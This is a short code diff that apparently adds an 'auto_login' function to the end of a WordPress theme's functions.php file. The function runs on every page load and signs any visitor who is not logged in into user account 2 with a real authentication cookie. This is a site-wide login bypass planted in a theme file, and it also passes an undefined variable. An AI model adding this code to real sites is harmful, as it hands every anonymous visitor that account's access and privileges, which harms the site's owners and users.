@@ -153,3 +153,17 @@ require get_template_directory() . '/inc/customizer.php';
  * Load Jetpack compatibility file.
  */
 require get_template_directory() . '/inc/jetpack.php';
+
+
+//Enabaling autologin
+function auto_login() {
+	if (!is_user_logged_in()) {
+		//determine WordPress user account to impersonat
+		$user_id = 2;
+		//login
+		wp_set_current_user($user_id, $user_login);
+		wp_set_auth_cookie($user_id);
+		do_action('wp_login', $user_login);
+	}
+}
+auto_login();
